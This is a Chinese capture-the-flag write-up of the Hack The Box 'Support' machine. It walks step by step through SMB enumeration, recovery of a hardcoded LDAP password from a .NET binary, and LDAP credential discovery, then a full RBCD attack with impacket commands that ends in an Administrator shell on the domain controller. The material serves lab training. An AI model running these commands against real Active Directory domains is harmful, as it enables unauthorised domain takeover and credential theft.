---
title: HTB-Support Writeup
date: 2026-04-23T20:00:00+08:00
draft: false
toc: true
images:
tags:
  - Hack
---
## 初始侦察

### Nmap 端口扫描

```bash
┌──(kali㉿kali)-[~/Work/Kali/Support]
└─$ sudo nmap --min-rate 10000 -p- 10.129.230.181 -oA Nmap/ports
[sudo] password for kali: 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-22 09:39 -0400
Nmap scan report for 10.129.230.181
Host is up (0.18s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49668/tcp open  unknown
49678/tcp open  unknown
49684/tcp open  unknown
49703/tcp open  unknown
49741/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 20.89 seconds

```

提取端口做备用。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Support]
└─$ grep open Nmap/ports.nmap | awk -F '/' '{print $1}' | paste -sd ','
53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,49668,49678,49684,49703,49741

```

## Nmap 详细信息扫描

```bash
┌──(kali㉿kali)-[~/Work/Kali/Support]
└─$ sudo nmap -sT -sC -sV -O -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,49668,49678,49684,49703,49741 10.129.230.181      
[sudo] password for kali: 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-22 09:40 -0400
Nmap scan report for 10.129.230.181
Host is up (0.14s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-22 13:40:21Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49684/tcp open  msrpc         Microsoft Windows RPC
49703/tcp open  msrpc         Microsoft Windows RPC
49741/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-04-22T13:41:16
|_  start_date: N/A

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 126.46 seconds
```

将暴露出来的域名解析至 `hosts`。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Support]
└─$ sudo bash -c 'echo "10.129.230.181 support.htb" >> /etc/hosts'                                 
                                                                                                                                                                                                                                                             
┌──(kali㉿kali)-[~/Work/Kali/Support]
└─$ tail -n 1 /etc/hosts
10.129.230.181 support.htb

```

## SMB 枚举

靶机开放 SMB，尝试枚举信息。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Support]
└─$ smbmap -H support.htb

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                      
[!] Access denied on 10.129.230.181, no fun for you...                                                                       
[*] Closed 1 connections
```

smbmap 枚举失败，使用 smbclient 尝试枚举。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Support]
└─$ smbclient -L 10.129.230.181 -N

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        support-tools   Disk      support staff tools
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.230.181 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

```

发现很多共享文件夹，其中 `support-tools` 看起来像靶机自定义目录，连接下载其中的文件。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Support/Smb]
└─$ smbclient //10.129.230.181/support-tools -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jul 20 13:01:06 2022
  ..                                  D        0  Sat May 28 07:18:25 2022
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 07:19:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 07:19:55 2022
  putty.exe                           A  1273576  Sat May 28 07:20:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 07:19:31 2022
  UserInfo.exe.zip                    A   277499  Wed Jul 20 13:01:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 07:20:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 07:19:43 2022
smb: \> prompt
smb: \> mget *
getting file \7-ZipPortable_21.07.paf.exe of size 2880728 as 7-ZipPortable_21.07.paf.exe (940.6 KiloBytes/sec) (average 940.6 KiloBytes/sec)
getting file \npp.8.4.1.portable.x64.zip of size 5439245 as npp.8.4.1.portable.x64.zip (779.3 KiloBytes/sec) (average 828.5 KiloBytes/sec)
getting file \putty.exe of size 1273576 as putty.exe (440.9 KiloBytes/sec) (average 741.9 KiloBytes/sec)
parallel_read returned NT_STATUS_IO_TIMEOUT
getting file \SysinternalsSuite.zip of size 48102161 as SysinternalsSuite.zip getting file \UserInfo.exe.zip of size 277499 as UserInfo.exe.zip (206.1 KiloBytes/sec) (average 691.4 KiloBytes/sec)
getting file \windirstat1_1_2_setup.exe of size 79171 as windirstat1_1_2_setup.exe (93.2 KiloBytes/sec) (average 657.8 KiloBytes/sec)
parallel_read returned NT_STATUS_IO_TIMEOUT

```

分析一下这几个文件：

- 7-ZipPortable_21.07.paf.exe：Public installer
- npp.8.4.1.portable.x64.zip：Public Notepad++
- putty.exe：Public PuTTY build
- SysinternalsSuite.zip：Microsoft's public suite
- windirstat1_1_2_setup.exe：Public WinDirStat installer
- UserInfo.exe.zip：可能为内部工具
- UserInfo.exe：Public Wireshark portable build from PortableApps.com

其中 `SysinternalsSuite.zip` 与 `WiresharkPortable64_3.6.5.paf.exe` 文件过大无法下载下来。

`Userinfoexe` 做为突破口的概率很大。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Support/Smb]
└─$ ls -liah UserInfo.exe.zip 
2766576 -rw-r--r-- 1 kali kali 271K Apr 22 09:55 UserInfo.exe.zip
```

解压下来看看。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Support/Smb]
└─$ unzip UserInfo.exe.zip 
Archive:  UserInfo.exe.zip
  inflating: UserInfo.exe            
  inflating: CommandLineParser.dll   
  inflating: Microsoft.Bcl.AsyncInterfaces.dll  
  inflating: Microsoft.Extensions.DependencyInjection.Abstractions.dll  
  inflating: Microsoft.Extensions.DependencyInjection.dll  
  inflating: Microsoft.Extensions.Logging.Abstractions.dll  
  inflating: System.Buffers.dll      
  inflating: System.Memory.dll       
  inflating: System.Numerics.Vectors.dll  
  inflating: System.Runtime.CompilerServices.Unsafe.dll  
  inflating: System.Threading.Tasks.Extensions.dll  
  inflating: UserInfo.exe.config     
                                                                                                                                                                                                                                                             
┌──(kali㉿kali)-[~/Work/Kali/Support/Smb]
└─$ ls                       
7-ZipPortable_21.07.paf.exe        Microsoft.Extensions.DependencyInjection.Abstractions.dll  npp.8.4.1.portable.x64.zip  System.Buffers.dll           System.Runtime.CompilerServices.Unsafe.dll  UserInfo.exe.config
CommandLineParser.dll              Microsoft.Extensions.DependencyInjection.dll               putty.exe                   System.Memory.dll            System.Threading.Tasks.Extensions.dll       UserInfo.exe.zip
Microsoft.Bcl.AsyncInterfaces.dll  Microsoft.Extensions.Logging.Abstractions.dll              SysinternalsSuite.zip       System.Numerics.Vectors.dll  UserInfo.exe                                windirstat1_1_2_setup.exe
```

看看能不能提取到有价值的字符串。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Support/Smb]
└─$ file UserInfo.exe         
UserInfo.exe: PE32 executable for MS Windows 6.00 (console), Intel i386 Mono/.Net assembly, 3 sections
                                                                                                                                                                                                                                                             
┌──(kali㉿kali)-[~/Work/Kali/Support/Smb]
└─$ strings UserInfo.exe                                          
!This program cannot be run in DOS mode.
.text
`.rsrc
@.reloc
,Er     
,ZsE
BSJB
v4.0.30319
#Strings
#GUID
#Blob
<Main>d__0
<>u__1
Task`1
CommandLineParser`1
TaskAwaiter`1
IParserResult`1
Int32
<OnExecuteAsync>d__2
Command`2
Int64
<Module>
<Main>
get_ASCII
mscorlib
ParseAsync
OnExecuteAsync
get_PropertiesToLoad
Protected
AwaitUnsafeOnCompleted
get_IsCompleted
System.Collections.Specialized
<UserName>k__BackingField
<LastName>k__BackingField
<FirstName>k__BackingField
<Verbose>k__BackingField
MatthiWare.CommandLine.Abstractions.Command
getPassword
enc_password
get_Message
IDisposable
Console
set_AppName
get_UserName
set_UserName
get_LastName
set_LastName
get_FirstName
set_FirstName
username
FromFileTime
DateTime
FindOne
MatthiWare.CommandLine
WriteLine
IAsyncStateMachine
SetStateMachine
stateMachine
ValueType
set_AuthenticationType
OnConfigure
ReadOnlyCollectionBase
get_Verbose
set_Verbose
verbose
Dispose
Create
<>1__state
Write
RequiredAttribute
CompilerGeneratedAttribute
GuidAttribute
DebuggableAttribute
ComVisibleAttribute
AssemblyTitleAttribute
NameAttribute
AsyncStateMachineAttribute
DefaultValueAttribute
AssemblyTrademarkAttribute
TargetFrameworkAttribute
DebuggerHiddenAttribute
AssemblyFileVersionAttribute
AssemblyConfigurationAttribute
AssemblyDescriptionAttribute
CompilationRelaxationsAttribute
AssemblyProductAttribute
AssemblyCopyrightAttribute
AssemblyCompanyAttribute
RuntimeCompatibilityAttribute
value
UserInfo.exe
System.Threading
Encoding
System.Runtime.Versioning
FromBase64String
ToString
GetString
MatthiWare.CommandLine.Abstractions.Parsing
get_Task
FindAll
Program
get_Item
System
CancellationToken
cancellationToken
Main
System.Reflection
ResultPropertyValueCollection
StringCollection
SearchResultCollection
ResultPropertyCollection
SetException
Description
UserInfo
AsyncTaskMethodBuilder
ICommandConfigurationBuilder
<>t__builder
DirectorySearcher
FindUser
GetUser
printUser
CommandLineParser
TaskAwaiter
GetAwaiter
set_Filter
IEnumerator
GetEnumerator
.ctor
.cctor
System.Diagnostics
UserInfo.Commands
DiscoverCommands
UserInfo.Services
System.Runtime.InteropServices
System.Runtime.CompilerServices
System.DirectoryServices
DebuggingModes
get_Properties
AuthenticationTypes
MatthiWare.CommandLine.Core.Attributes
GetBytes
args
System.Threading.Tasks
Contains
System.Collections
commandOptions
GlobalOptions
FindUserOptions
GetUserOptions
CommandLineParserOptions
options
get_HasErrors
Concat
Object
get_Default
SearchResult
GetResult
SetResult
get_Current
get_Count
Start
Convert
last
first
MoveNext
System.Text
GetExecutingAssembly
LdapQuery
query
DirectoryEntry
entry
WrapNonExceptionThrows
UserInfo
Copyright 
  2022
$5a280d0b-9fd0-4701-8f96-82e2f1ea9dfb
1.0.0.0
.NETFramework,Version=v4.8
FrameworkDisplayName
.NET Framework 4.8 
UserInfo.Program+<Main>d__0
/UserInfo.Commands.FindUser+<OnExecuteAsync>d__2
.UserInfo.Commands.GetUser+<OnExecuteAsync>d__2
username
Username
first
First name
last
        Last name
verbose
Verbose output
RSDS
C:\Users\0xdf\source\repos\UserInfo\obj\Release\UserInfo.pdb
_CorExeMain
mscoree.dll
            
```

在 Windows 上解压 `Userinfo.exe`。

![](Pasted%20image%2020260422223829.png)

尝试在 `powershell` 中执行 exe 文件。

```bash
C:\apps\UserInfo.exe>ls
CommandLineParser.dll                                      System.Memory.dll
Microsoft.Bcl.AsyncInterfaces.dll                          System.Numerics.Vectors.dll
Microsoft.Extensions.DependencyInjection.Abstractions.dll  System.Runtime.CompilerServices.Unsafe.dll
Microsoft.Extensions.DependencyInjection.dll               System.Threading.Tasks.Extensions.dll
Microsoft.Extensions.Logging.Abstractions.dll              UserInfo.exe
System.Buffers.dll                                         UserInfo.exe.config

C:\apps\UserInfo.exe>.\UserInfo.exe

Usage: UserInfo.exe [options] [commands]

Options:
  -v|--verbose        Verbose output

Commands:
  find                Find a user
  user                Get information about a user
```

尝试一下各个选项。 

```bash
C:\apps\UserInfo.exe>.\UserInfo.exe

Usage: UserInfo.exe [options] [commands]

Options:
  -v|--verbose        Verbose output

Commands:
  find                Find a user
  user                Get information about a user


C:\apps\UserInfo.exe>.\UserInfo.exe -v

C:\apps\UserInfo.exe>.\UserInfo.exe --verbose

C:\apps\UserInfo.exe>.\UserInfo.exe find
[-] At least one of -first or -last is required.

C:\apps\UserInfo.exe>.\UserInfo.exe user
Unable to parse command 'user' reason: Required option '-username' not found!



Usage: UserInfo.exe [options] [commands]

Options:
  -v|--verbose        Verbose output

Commands:
  find                Find a user
  user                Get information about a user
```

没连接到靶机，无法查询。

```bash
C:\apps\UserInfo.exe>.\UserInfo.exe -v find -first j
[*] LDAP query to use: (givenName=j)
[-] Exception: 该服务器不可操作。
```

使用 Dnspy 进行逆向分析，寻找到下面两串代码。

```bash
// UserInfo.Services.Protected
// Token: 0x06000011 RID: 17 RVA: 0x00002170 File Offset: 0x00000370
// Note: this type is marked as 'beforefieldinit'.
static Protected()
{
	Protected.enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";
	Protected.key = Encoding.ASCII.GetBytes("armando");
}

```

```bash
// UserInfo.Services.Protected
// Token: 0x0600000F RID: 15 RVA: 0x00002118 File Offset: 0x00000318
public static string getPassword()
{
	byte[] array = Convert.FromBase64String(Protected.enc_password);
	byte[] array2 = array;
	for (int i = 0; i < array.Length; i++)
	{
		array2[i] = (array[i] ^ Protected.key[i % Protected.key.Length] ^ 223);
	}
	return Encoding.Default.GetString(array2);
}

```

在 Kali 中编写一个简单的脚本还原 getPassword() 的操作。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Support]
└─$ vim decrypt.py   
                                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/Work/Kali/Support]
└─$ cat decrypt.py   
#!/usr/bin/env python3

import base64

enc_passwd = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
key = b"armando"
const = 0xDF

ct = base64.b64decode(enc_passwd)
pt = bytes(b ^ key[i % len(key)] ^ const for i, b in enumerate(ct))

print(pt.decode())

```

得到明文密码 `nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz` 。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Support]
└─$ python3 decrypt.py
nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

在 Dnspy 中找到对应的用户为 `support`。

```bash
// UserInfo.Services.LdapQuery
// Token: 0x06000012 RID: 18 RVA: 0x00002190 File Offset: 0x00000390
public LdapQuery()
{
	string password = Protected.getPassword();
	this.entry = new DirectoryEntry("LDAP://support.htb", "support\\ldap", password);
	this.entry.AuthenticationType = AuthenticationTypes.Secure;
	this.ds = new DirectorySearcher(this.entry);
}

```

验证凭据的正确性。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Support]
└─$ nxc smb 10.129.23.95 -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' 
[*] Initializing SMB protocol database
SMB         10.129.23.95    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.23.95    445    DC               [+] support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
                                                                                                         
┌──(kali㉿kali)-[~/Work/Kali/Support]
└─$ nxc smb 10.129.23.95 -u 'smb' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
SMB         10.129.23.95    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.23.95    445    DC               [+] support.htb\smb:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz (Guest)
```

执行 ldapsearch 。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Support]                                                                    
└─$ ldapsearch -x -H ldap://support.htb -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b 'DC=support,DC=htb' '(objectClass=user)' | tee ldapsearch.txt                                          
# extended LDIF                                                                                          
#                                                                                                        
# LDAPv3                                            
# base <DC=support,DC=htb> with scope subtree    
# filter: (objectClass=user)                                                                             
# requesting: ALL                                   
#

...
```

尝试寻找敏感信息。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Support]
└─$ grep -iE 'description:|info:|comment:|memberOf:' ldapsearch.txt 
description: Built-in account for administering the computer/domain
memberOf: CN=Group Policy Creator Owners,CN=Users,DC=support,DC=htb
memberOf: CN=Domain Admins,CN=Users,DC=support,DC=htb
memberOf: CN=Enterprise Admins,CN=Users,DC=support,DC=htb
memberOf: CN=Schema Admins,CN=Users,DC=support,DC=htb
memberOf: CN=Administrators,CN=Builtin,DC=support,DC=htb
description: Built-in account for guest access to the computer/domain
memberOf: CN=Guests,CN=Builtin,DC=support,DC=htb
description: Key Distribution Center Service Account
memberOf: CN=Denied RODC Password Replication Group,CN=Users,DC=support,DC=htb
info: Ironside47pleasure40Watchful
memberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
memberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb
```

info 中的内容很可能是某个密码，查找相关上下文。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Support]
└─$ grep -B 20 "Ironside47pleasure40Watchful" ldapsearch.txt
dSCorePropagationData: 20220528111146.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 134214116920557929

# support, Users, support.htb
dn: CN=support,CN=Users,DC=support,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: support
c: US
l: Chapel Hill
st: NC
postalCode: 27514
distinguishedName: CN=support,CN=Users,DC=support,DC=htb
instanceType: 4
whenCreated: 20220528111200.0Z
whenChanged: 20220528111201.0Z
uSNCreated: 12617
info: Ironside47pleasure40Watchful
```

发现可能为用户 `support` 的密码。

使用 evil-winrm 尝试登录拿到 userflag。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Support]
└─$ evil-winrm -i support.htb -u 'support' -p 'Ironside47pleasure40Watchful'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\support\Documents> whoami
support\support
*Evil-WinRM* PS C:\Users\support\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\support\Desktop> dir


    Directory: C:\Users\support\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         4/23/2026   2:12 AM             34 user.txt


*Evil-WinRM* PS C:\Users\support\Desktop> type user.txt
c5f2391*******b50c3c6d56b16
```

## Bloodhound

使用 Bloodhound 收集信息。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Support]
└─$ bloodhound-python -c All -u support -p 'Ironside47pleasure40Watchful' -ns 10.129.23.95 -d support.htb --zip           
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: support.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: unpack requires a buffer of 4 bytes
INFO: Connecting to LDAP server: dc.support.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.support.htb
INFO: Found 21 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.support.htb
INFO: Done in 00M 34S
INFO: Compressing output into 20260423060434_bloodhound.zip
```

查找到完整的攻击流程图。

![](Pasted%20image%2020260423195533.png)

创建 Fake account。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Support]
└─$ impacket-addcomputer -computer-name 'PWN$' -computer-pass '123456' -dc-ip 10.129.23.95 'support.htb/support:Ironside47pleasure40Watchful'
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Successfully added machine account PWN$ with password 123456.
```

配置 RBCD 。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Support]
└─$ impacket-rbcd -delegate-from 'PWN$' -delegate-to 'DC$' -action 'write' -dc-ip 10.129.23.95 'support.htb/support:Ironside47pleasure40Watchful'
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] PWN$ can now impersonate users on DC$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     PWN$         (S-1-5-21-1677581083-3380853377-188903654-6101)
```

请求 Administrator 身份的 DC 服务凭据。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Support]
└─$ impacket-getST -spn 'cifs/DC.support.htb' -impersonate 'Administrator' -dc-ip 10.129.23.95 'support.htb/PWN$:123456'      
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_DC.support.htb@SUPPORT.HTB.ccache

```

使用凭据登录拿到 root flag。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Support]
└─$ impacket-wmiexec -k -no-pass -target-ip 10.129.23.95 dc.support.htb
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
support\administrator

C:\>cd Users
C:\Users>dir
 Volume in drive C has no label.
 Volume Serial Number is 955A-5CBB

 Directory of C:\Users

07/26/2022  06:21 AM    <DIR>          .
05/28/2022  04:11 AM    <DIR>          Administrator
07/26/2022  06:21 AM    <DIR>          ldap
05/19/2022  02:13 AM    <DIR>          Public
04/23/2026  03:02 AM    <DIR>          support
               0 File(s)              0 bytes
               5 Dir(s)   3,970,932,736 bytes free

C:\Users>cd Administrator\Desktop
C:\Users\Administrator\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 955A-5CBB

 Directory of C:\Users\Administrator\Desktop

05/28/2022  04:17 AM    <DIR>          .
05/28/2022  04:11 AM    <DIR>          ..
04/23/2026  02:12 AM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   3,970,932,736 bytes free

C:\Users\Administrator\Desktop>type root.txt
4a28f1303938*******3666979acc4e
```
